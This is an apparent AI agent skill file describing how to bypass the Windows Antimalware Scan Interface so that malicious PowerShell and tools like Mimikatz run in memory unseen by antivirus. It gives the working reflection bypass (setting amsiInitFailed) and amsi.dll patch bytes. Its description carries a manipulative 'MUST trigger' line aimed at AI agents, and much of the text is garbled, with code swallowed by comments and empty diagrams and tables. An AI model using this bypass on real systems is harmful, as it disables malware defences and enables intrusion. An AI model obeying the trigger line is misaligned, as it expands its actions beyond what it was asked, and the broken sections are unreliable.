---
name: amsi-bypass
description: >
  [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
  Utilize memory patching and obfuscation techniques to dynamically bypass the Windows Antimalware 
  Scan Interface (AMSI) in memory. This allows Red Teamers to execute malicious PowerShell, VBScript, 
  or .NET assemblies without interference from Microsoft Defender or third-party AVs hooked into AMSI.
domain: cybersecurity
subdomain: red-teaming
category: Evasion
difficulty: expert
estimated_time: "3-5 hours"
mitre_attack:
  tactics: [TA0005]
  techniques: [T1562.001]
platforms: [windows]
tags: [amsi, evasion, powershell, red-teaming, memory-patching, defense-evasion]
tools: [powershell, x64dbg, frida]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# AMSI Bypass

## When to Use
- When operating on a Windows target during a Red Team engagement where PowerShell or .NET memory execution is required, but an EDR/AV is actively inspecting script contents via AMSI.
- To execute tools like Mimikatz or BloodHound directly in memory without dropping detectable binaries to the disk.

## Workflow

### Phase 1: Understanding AMSI

```text
# Concept: AMSI 1. ```

### Phase 2: The Memory Patching Technique (amsi.dll)

```powershell
# Concept: 1. The Patch $MemoryPatch = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).ToInt32()

# A classic bypass $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3) 
# Return ```

### Phase 3: Obfuscating the Bypass

```powershell
# $Ref = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
$Field = $Ref.GetField("amsiInitFailed", "NonPublic,Static")
$Field.SetValue($null, $true)
```

### Phase 4: Validating the Bypass

```powershell
# Invoke-Expression 'Write-Host "AMSI is Bypassed!"'
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Launch ] --> B[Execute ]
    B --> C{Does ]}
    C -->|Yes| D[Load ]
    C -->|No| E[Obfuscate ]
    D --> F[Execute ]
```

## 🔵 Blue Team Detection & Defense
- **ETW (Event Tracing for Windows)**: **VBS/PowerShell Constrained Language Mode**: **Memory Integrity (HVCI)**: Key Concepts
| Concept | Description |
|---------|-------------|
| AMSI | |
| Reflection | |

## References
- CyberArk: [Bypassing AMSI: A comprehensive guide](https://www.cyberark.com/resources/threat-research-blog/amsi-bypass-redux)
- SANS: [Living off the Land and AMSI Bypass](https://www.sans.org/white-papers/39900/)
- Microsoft: [How AMSI helps you defend against malware](https://docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps)
